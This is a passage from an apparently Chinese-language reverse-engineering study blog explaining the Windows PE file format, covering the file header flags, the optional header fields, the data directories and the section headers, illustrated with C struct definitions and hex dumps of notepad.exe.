<span class="comment">// Local symbols stripped from file.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_AGGRESIVE_WS_TRIM        0x0010  <span class="comment">// Agressively trim working set</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_LARGE_ADDRESS_AWARE      0x0020  <span class="comment">// App can handle &gt;2gb addresses</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_LO        0x0080  <span class="comment">// byte of machine word are reversed.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_32BIT_MACHINE            0x0100  <span class="comment">// 32 bit word machine.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_DEBUG_STRIPPED           0x0200  <span class="comment">// Debugging info stripped from</span></span></span><br><span class="line">                                                    <span class="comment">// file in .DBG file</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP  0x0400  <span class="comment">// If Image is on removable media,</span></span></span><br><span class="line">                                                    <span class="comment">// copy and run from the swap file.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_NET_RUN_FROM_SWAP        0x0800  <span class="comment">// If Image is on Net,</span></span></span><br><span class="line">                                                    <span class="comment">// copy and run from the swap file.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_SYSTEM                   0x1000  <span class="comment">// System File.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_DLL                      0x2000  <span class="comment">// File is a DLL.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_UP_SYSTEM_ONLY           0x4000  <span class="comment">// File should only be run on a UP machine</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_HI        0x8000  <span class="comment">// byte of machine word are reversed.</span></span></span><br></pre></td></tr></table></figure><p>PE 中 <code>Characteristics</code> 的值有可能不是 0002h（不可执行），比如类似 <code>*.obj</code> 的 object 文件以及 resource DLL 文件等。</p><p>最后讲一下 <code>IMAGE_FILE_HEADER</code> 的 <code>TimeDateStamp</code> 成员。改成成员的值不影响文件运行，用来记录编译器创建此文件的时间。但是有些开发工具（VB、VC++）提供了设置该值的工具，而有些开发工具（Delphi）则未提供（且随所用选项的不同而不同）。</p><h4 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h4><p><code>IMAGE_FILE_HEADER</code> 的结构体。</p><p><img src="/pics/BIN集训/RE/三/6.png" alt="IMAGE_FILE_HEADER"></p><p>以结构体成员的形式表示如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ IMAGE_FILE_HEADER ] - notepad.exe</span><br><span class="line"></span><br><span class="line"> offset   value   description</span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line">000000E4     014C machine</span><br><span class="line">000000E6     0003 number of sections</span><br><span class="line">000000E8 48025287 time date stamp (Mon Apr 14 03:35:51 2008)</span><br><span class="line">000000EC 00000000 offset to symble table</span><br><span class="line">000000F0 00000000 number of symbols</span><br><span class="line">000000F4     00E0 size of optional header</span><br><span class="line">000000F6     010F characteristics</span><br><span class="line">                      IMAGE_FILE_RELOCS_STRIPPED</span><br><span class="line">                      IMAGE_FILE_EXECUTABLE_IMAGE</span><br><span class="line">                      IMAGE_FILE_LINE_NUMS_STRIPPED</span><br><span class="line">                      IMAGE_FILE_LOCAL_SYMS_STRIPPED</span><br><span class="line">                      IMAGE_FILE_32BIT_MACHINE</span><br></pre></td></tr></table></figure><h3 id="NT-头：可选头"><a href="#NT-头：可选头" class="headerlink" title="NT 头：可选头"></a>NT 头：可选头</h3><p><code>IMAGE_OPTIIONAL_HEADER32</code> 是 PE 头结构体中最大的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    WORD    Magic;                          <span class="comment">// 标志字, ROM 映像（0107h），普通可执行文件（010Bh）</span></span><br><span class="line">    BYTE    MajorLinkerVersion;             <span class="comment">// 链接程序的主版本号</span></span><br><span class="line">    BYTE    MinorLinkerVersion;             <span class="comment">// 链接程序的次版本号</span></span><br><span class="line">    DWORD   SizeOfCode;                     <span class="comment">// 所有含代码的节的总大小</span></span><br><span class="line">    DWORD   SizeOfInitializedData;          <span class="comment">// 所有含已初始化数据的节的总大小</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;        <span class="comment">// 所有含未初始化数据的节的大小</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;            <span class="comment">// 程序执行入口 RVA</span></span><br><span class="line">    DWORD   BaseOfCode;                     <span class="comment">// 代码的区块的起始 RVA</span></span><br><span class="line">    DWORD   BaseOfData;                     <span class="comment">// 数据的区块的起始 RVA</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    DWORD   ImageBase;                      <span class="comment">// 程序的首选装载地址</span></span><br><span class="line">    DWORD   SectionAlignment;               <span class="comment">// 内存中的区块的对齐大小，一般为 0x1000</span></span><br><span class="line">    DWORD   FileAlignment;                  <span class="comment">// 文件中的区块的对齐大小，一般为 0x200</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的副版本号</span></span><br><span class="line">    WORD    MajorImageVersion;              <span class="comment">// 可运行于操作系统的主版本号</span></span><br><span class="line">    WORD    MinorImageVersion;              <span class="comment">// 可运行于操作系统的次版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion;          <span class="comment">// 要求最低子系统版本的主版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion;          <span class="comment">// 要求最低子系统版本的次版本号</span></span><br><span class="line">    DWORD   Win32VersionValue;              <span class="comment">// 莫须有字段，不被病毒利用的话一般为 0</span></span><br><span class="line">    DWORD   SizeOfImage;                    <span class="comment">// 映像装入内存后的总尺寸</span></span><br><span class="line">    DWORD   SizeOfHeaders;                  <span class="comment">// 所有头 + 区块表的尺寸大小</span></span><br><span class="line">    DWORD   CheckSum;                       <span class="comment">// 映像的校检和</span></span><br><span class="line">    WORD    Subsystem;                      <span class="comment">// 可执行文件期望的子系统</span></span><br><span class="line">    WORD    DllCharacteristics;             <span class="comment">// DllMain() 函数何时被调用，默认为 0</span></span><br><span class="line">    DWORD   SizeOfStackReserve;             <span class="comment">// 初始化时的栈大小</span></span><br><span class="line">    DWORD   SizeOfStackCommit;              <span class="comment">// 初始化时实际提交的栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;              <span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;               <span class="comment">// 初始化时实际提交的堆大小</span></span><br><span class="line">    DWORD   LoaderFlags;                    <span class="comment">// 与调试有关，默认为 0</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;            <span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16</span></span><br><span class="line">    <span class="comment">// 数据目录表，保存了各种表的RVA及大小</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>在 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体中需要关注下列成员。这些值谁文件运行必需的，设置错误将导致文件无法正常运行。</p><h4 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h4><p>为 <code>IMAGE_OPTIONAL_HEADER32</code> 结构体时，Magic 码为 10B；为 <code>IMAGE_OPTIONAL_HEADER64</code> 结构体时，Magic 码为 20B。</p><h4 id="AddressOfEntryPoint"><a href="#AddressOfEntryPoint" class="headerlink" title="AddressOfEntryPoint"></a>AddressOfEntryPoint</h4><p><code>AddressOfEntryPoint</code> 持有 EP 的 RVA 值。该值指出程序最先执行的代码起始地址，相当重要。</p><h4 id="ImageBase"><a href="#ImageBase" class="headerlink" title="ImageBase"></a>ImageBase</h4><p>进程虚拟内存的范围时 0~FFFFFFFF（32 位系统）。PE 文件被加载到如此大的内存中时，<code>ImageBase</code> 指出文件的优先装入地址。</p><p>EXE、DLL 文件被装载到用户内存的 0~7FFFFFFF 中，SYS 文件被载入内核内存的 80000000~FFFFFFFF 中。一般而言，使用开发工具（VB/VC++/Delphi）创建好 EXE 文件后，其 <code>ImgaeBase</code> 的值为 00400000，DLL 文件的 <code>ImgaeBase</code> 值为 10000000（当然也可以指定为其他值）。执行 PE 文件时，PE 装载器先创建进程，再将文件载入内存，然后把 EIP 寄存器的值设置为 <code>ImageBase+AddressOfEntryPoint</code>。</p><h4 id="SectiionAlignment，FileAlignment"><a href="#SectiionAlignment，FileAlignment" class="headerlink" title="SectiionAlignment，FileAlignment"></a>SectiionAlignment，FileAlignment</h4><p>PE 文件的 Body 部分划分为若干节区，这些节存储着不同类别的数据。<code>FileAlignment</code> 指定了节区在磁盘文件中的最小单位，而 <code>SectionAlignment</code> 则指定了节区在内存中的最小单位（一个文件中，<code>FileAlignment</code> 与 <code>SectionAlignment</code> 的值可能相同，也可能不同）。磁盘文件或内存的节区大小必定为 <code>FileAlignment</code> 或 <code>SectionAlignment</code> 值的整数倍。</p><h4 id="SizeOfImage"><a href="#SizeOfImage" class="headerlink" title="SizeOfImage"></a>SizeOfImage</h4><p>加载 PE 文件到内存时，<code>SizeOfImage</code> 指定了 PE Image 在虚拟内存中所占的空间的大小。一般而言，文件的大小与加载到内存中的大小是不同的（节区头中定义了各节装载的位置与占有内存的大小）。</p><h4 id="SizeOfHeader"><a href="#SizeOfHeader" class="headerlink" title="SizeOfHeader"></a>SizeOfHeader</h4><p><code>SizeOfHeader</code> 用来指出整个 PE 头的大小。该值也必须是 <code>FileAlignment</code> 的整数倍。第一节区所在位置与 <code>SizeOfHeader</code> 距文件开始偏移的量相同。</p><h4 id="Subsystem"><a href="#Subsystem" class="headerlink" title="Subsystem"></a>Subsystem</h4><p>该 <code>Subsystem</code> 值用来区分系统驱动文件（<code>*.sys</code>）与普通的可执行文件（<code>*.exe</code>，<code>*.dll</code>）。<code>Subsystem</code> 成员可拥有的值如下。</p><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">含义</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">Driver 文件</td><td style="text-align:center">系统驱动（如：<code>ntfs.sys</code>）</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">GUI 文件</td><td style="text-align:center">窗口应用程序（如：<code>notepad.exe</code>）</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">CUI 文件</td><td style="text-align:center">控制台应用程序（如：<code>cmd.exe</code>）</td></tr></tbody></table><h4 id="NumberOfRvaAndSizes"><a href="#NumberOfRvaAndSizes" class="headerlink" title="NumberOfRvaAndSizes"></a>NumberOfRvaAndSizes</h4><p><code>NumberOfRvaAndSizes</code> 用来指定 <code>DataDirectory</code>（<code>IMAGE_OPTIONAL_HEADER32</code> 结构体的最后一个成员）数组的个数。虽然结构体定义中明确指出了数组个数为 <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES(16)</code>，但是 PE 装载器通过查看 <code>NumberOfRvaAndSizes</code> 值来识别数组大小，换言之，数组大小也可能不是 16。</p><h4 id="DataDirectory"><a href="#DataDirectory" class="headerlink" title="DataDirectory"></a>DataDirectory</h4><p><code>DataDirectory</code> 是由 <code>IMAGE_DATA_DIRECTORY</code> 结构体组成的数组，数组的每项都有被定义的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DataDirectory[<span class="number">0</span>] = EXPORT Directory</span><br><span class="line">DataDirectory[<span class="number">1</span>] = IMPORT Directory</span><br><span class="line">DataDirectory[<span class="number">2</span>] = RESOURCE Directory</span><br><span class="line">DataDirectory[<span class="number">3</span>] = EXCEPTION Directory</span><br><span class="line">DataDirectory[<span class="number">4</span>] = SECURITY Directory</span><br><span class="line">DataDirectory[<span class="number">5</span>] = BASERELOC Directory</span><br><span class="line">DataDirectory[<span class="number">6</span>] = DEBUG Directory</span><br><span class="line">DataDirectory[<span class="number">7</span>] = COPYRIGHT Directory</span><br><span class="line">DataDirectory[<span class="number">8</span>] = GLOBALPTR Directory</span><br><span class="line">DataDirectory[<span class="number">9</span>] = TLS Directory</span><br><span class="line">DataDirectory[A] = LOAD_CONFIG Directory</span><br><span class="line">DataDirectory[B] = BOUND_IMPORT Directory</span><br><span class="line">DataDirectory[C] = IAT Directory</span><br><span class="line">DataDirectory[D] = DELAY_IMPORT Directory</span><br><span class="line">DataDirectory[E] = COM_DESCRIPTOR Directory</span><br><span class="line">DataDirectory[F] = Reserved Directory</span><br></pre></td></tr></table></figure><p>将此处所说的 <code>Directory</code> 想成某个结构体数组即可。比较重要的是<code>EXPORT/IMPORT/RESOURCE</code>、<code>TLS Direction</code>。</p><h4 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h4><p><code>IMAGE_OPTIONAL_HEADER</code> 整个结构体。</p><p><img src="/pics/BIN集训/RE/三/7.png" alt="IMAGE_OPTIONAL_HEADER"></p><p>结构体各成员的值及其说明如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[ IMAGE_OPTIONAL_HEADER ] - notepad.exe</span><br><span class="line"></span><br><span class="line"> offset   value   description</span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line">000000F8     010B magic</span><br><span class="line">000000FA       07 major liinker version</span><br><span class="line">000000FB       0A minor liinker version</span><br><span class="line">000000FC 00007800 size of code</span><br><span class="line">00000100 00008C00 size of initialized data</span><br><span class="line">00000104 00000000 size of uninitialized data</span><br><span class="line">00000108 0000739D address of entry point</span><br><span class="line">0000010C 00001000 base of code</span><br><span class="line">00000110 00009000 base of data</span><br><span class="line">00000114 01000000 image base</span><br><span class="line">00000118 00001000 section alignment</span><br><span class="line">0000011C 00000200 file alignment</span><br><span class="line">00000120     0005 major OS version</span><br><span class="line">00000122     0001 minor OS version</span><br><span class="line">00000124     0005 major image version</span><br><span class="line">00000126     0001 minor image version</span><br><span class="line">00000128     0004 major subsystem version</span><br><span class="line">0000012A     0000 minor subsystem version</span><br><span class="line">0000012C 00000000 win32 version value</span><br><span class="line">00000130 00014000 size of image</span><br><span class="line">00000134 00000400 size of headers</span><br><span class="line">00000138 000126CE Checksum</span><br><span class="line">0000013C     0002 subsystem</span><br><span class="line">0000013E     8000 DLL characteristics</span><br><span class="line">00000140 00040000 size of stack reserve</span><br><span class="line">00000144 00011000 size of stack commit</span><br><span class="line">00000148 00100000 size of heap reserve</span><br><span class="line">0000014C 00001000 size of heap commit</span><br><span class="line">00000150 00000000 loader flags</span><br><span class="line">00000154 00000010 number of directories</span><br><span class="line">00000158 00000000 RVA  of EXPORT Directory</span><br><span class="line">0000015C 00000000 size of EXPORT Directory</span><br><span class="line">00000160 00007604 RVA  of IMPORT Directory</span><br><span class="line">00000164 000000C8 size of IMPORT Directory</span><br><span class="line">00000168 00000000 RVA  of RESOURCE Directory</span><br><span class="line">0000016C 00008304 size of RESOURCE Directory</span><br><span class="line">00000170 00000000 RVA  of EXCEPTION Directory</span><br><span class="line">00000174 00000000 size of EXCEPTION Directory</span><br><span class="line">00000178 00000000 RVA  of SECURITY Directory</span><br><span class="line">0000017C 00000000 size of SECURITY Directory</span><br><span class="line">00000180 00000000 RVA  of BASERELOC Directory</span><br><span class="line">00000184 00000000 size of BASERELOC Directory</span><br><span class="line">00000188 00001350 RVA  of DEBUG Directory</span><br><span class="line">0000018C 0000001C size of DEBUG Directory</span><br><span class="line">00000190 00000000 RVA  of COPYRIGHT Directory</span><br><span class="line">00000194 00000000 size of COPYRIGHT Directory</span><br><span class="line">00000198 00000000 RVA  of GLOBALPTR Directory</span><br><span class="line">0000019C 00000000 size of GLOBALPTR Directory</span><br><span class="line">000001A0 00000000 RVA  of TLS Directory</span><br><span class="line">000001A4 00000000 size of TLS Directory</span><br><span class="line">000001A8 000018A8 RVA  of LOAD_CONFIG Directory</span><br><span class="line">000001AC 00000040 size of LOAD_CONFIG Directory</span><br><span class="line">000001B0 00000250 RVA  of BOUND_IMPORT Directory</span><br><span class="line">000001B4 000000D0 size of BOUND_IMPORT Directory</span><br><span class="line">000001B8 00001000 RVA  of IAT Directory</span><br><span class="line">000001BC 00000348 size of IAT Directory</span><br><span class="line">000001C0 00000000 RVA  of DELAY_IMPORT Directory</span><br><span class="line">000001C4 00000000 size of DELAY_IMPORT Directory</span><br><span class="line">000001C8 00000000 RVA  of COM_DESCRIPTOR Directory</span><br><span class="line">000001CC 00000000 size of COM_DESCRIPTOR Directory</span><br><span class="line">000001D0 00000000 RVA  of Reserved Directory</span><br><span class="line">000001D4 00000000 size of Reserved Directory</span><br></pre></td></tr></table></figure><h3 id="节区头"><a href="#节区头" class="headerlink" title="节区头"></a>节区头</h3><p>节区头中定义了各节区属性。前面提到过，PE 文件中的 code（代码）、data（数据）、resource（资源）等按照属性分类存储在不同节区。</p><p>把 PE 文件创建成多个节区结构的好处是可以保证程序的安全性。若把 code 与 data 放在一个节区中相互纠缠很容易引发安全问题，即使忽略过程的烦琐。</p><p>假如向字符串 data 写数据时，由于某个原因导致溢出（输入超过缓冲区大小时），那么其下的 code（指令）就会被覆盖，应用程序就会崩溃。因此，PE 文件格式的设计者们决定把具有相似属性的数据统一保存在一个被称为 “节区” 的地方，然后需要把各节区属性记录在节区头中（节区属性中有文件/内存的起始位置、大小、访问权限等）。</p><p>换言之，需要为每个 code/data/resource 分别设置不同的特性、访问权限等，如下表。</p><table><thead><tr><th style="text-align:center">类别</th><th style="text-align:center">访问权限</th></tr></thead><tbody><tr><td style="text-align:center">code</td><td style="text-align:center">执行，读取权限</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">非执行，读写权限</td></tr><tr><td style="text-align:center">resource</td><td style="text-align:center">非执行，读取权限</td></tr></tbody></table><h4 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a>IMAGE_SECTION_HEADER</h4><p>节区头是由 <code>IMAGE_SECTION_HEADER</code> 结构体组成的数组，每个结构体对应一个节区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> IMAGE_SIZEOF_SHORT_NAME 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];  <span class="comment">// 区块的名称，如 “.text”</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;        <span class="comment">// 物理地址</span></span><br><span class="line">            DWORD   VirtualSize;            <span class="comment">// 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                 <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">    DWORD   SizeOfRawData;                  <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData;               <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">    DWORD   PointerToRelocations;           <span class="comment">// 在 OBJ 文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD   PointerToLinenumbers;           <span class="comment">// 行号表的偏移（供调试使用地)</span></span><br><span class="line">    WORD    NumberOfRelocations;            <span class="comment">// 在 OBJ 文件中使用，重定位项数目</span></span><br><span class="line">    WORD    NumberOfLinenumbers;            <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">    DWORD   Characteristics;                <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>下表中列出了 <code>IMAGE_SECTION_HEADER</code> 结构体中要了解的重要成员（不使用其他成员）。</p><table><thead><tr><th style="text-align:center">项目</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>VirtualSize</code></td><td style="text-align:center">内存中节区所占大小</td></tr><tr><td style="text-align:center"><code>VirtualAddress</code></td><td style="text-align:center">内存中节区起始地址（RVA）</td></tr><tr><td style="text-align:center"><code>SizeOfRawData</code></td><td style="text-align:center">磁盘文件中节区所占大小</td></tr><tr><td style="text-align:center"><code>PointerToRawData</code></td><td style="text-align:center">磁盘文件中节区起始位置</td></tr><tr><td style="text-align:center"><code>Characteristics</code></td><td style="text-align:center">节区属性（bit OR）</td></tr></tbody></table><p><code>VirtualAddress</code> 与 <code>PointerToRawData</code> 不带有任何值，分别由（定义在 <code>IMAGE_OPTIONAL_HEADER32</code> 中的）<code>SectionAlignment</code> 与 <code>FileAlignment</code> 确定。</p><p><code>VirutalSize</code> 与 <code>SizeOfRawData</code> 一般具有不同的值，即磁盘文件中节区的大小与加载到内存中的节区大小是不同的。</p><p><code>Characteristics</code> 由以下代码中现实的值组合（bit OR）而成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SCN_CNT_CODE                0x00000020 <span class="comment">// Section contains code.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SCN_CNT_INITIALIZED_DATA    0x00000040 <span class="comment">// Section contains initialized data.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SCN_CNT_UNINITIALIZED_DATA  0x00000080 <span class="comment">// Section contains uninitialized data.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SCN_MEM_EXECUTE             0x20000000 <span class="comment">// Section is executable.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SCN_MEM_READ                0x40000000 <span class="comment">// Section is readable.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SCN_MEM_WRITE               0x80000000 <span class="comment">// Section is writable.</span></span></span><br></pre></td></tr></table></figure><p>最后讲一下 Name 字段。Name 成员不像 C 语言中的字符串一样以 NULL 结束，并且没有 “必须使用 ASCII 值” 的限制。PE 规范未明确规定节区的 Name，所以可以向其中仿佛任何值，甚至可以填充 NULL 值。所以节区的 Name 仅供参考，不能保证其百分之百地被用作某种信息（数据节区的名称也可叫做 <code>.code</code>）。</p><p><img src="/pics/BIN集训/RE/三/8.png" alt="notepad.exe 的 IMAGE_SECTION_HEADER 结构体数组"></p><p>各结构体成员如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">[ IMAGE_SECTION_HEADER ]</span><br><span class="line"></span><br><span class="line"> offset   value   description</span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line">000001D8 2E746578 Name (.text)</span><br><span class="line">000001DC 74000000</span><br><span class="line">000001E0 00007748 virtual size</span><br><span class="line">000001E4 00001000 RVA</span><br><span class="line">000001E8 00007800 size of raw data</span><br><span class="line">000001EC 00000400 offset to raw data</span><br><span class="line">000001F0 00000000 offset to relocations</span><br><span class="line">000001F4 00000000 offset to line numbers</span><br><span class="line">000001F8     0000 number of relocations</span><br><span class="line">000001FA     0000 number of line numbers</span><br><span class="line">000001FC 60000020 characteristics</span><br><span class="line">                    IMAGE_SCN_CNT_CODE</span><br><span class="line">                    IMAGE_SCN_MEM_EXECUTE</span><br><span class="line">                    IMAGE_SCN_MEM_READ</span><br><span class="line"></span><br><span class="line">00000200 2E646174 Name (.data)</span><br><span class="line">00000204 61000000</span><br><span class="line">00000208 00001BA8 virtual size</span><br><span class="line">0000020C 00009000 RVA</span><br><span class="line">00000210 00000800 size of raw data</span><br><span class="line">00000214 00007C00 offset to raw 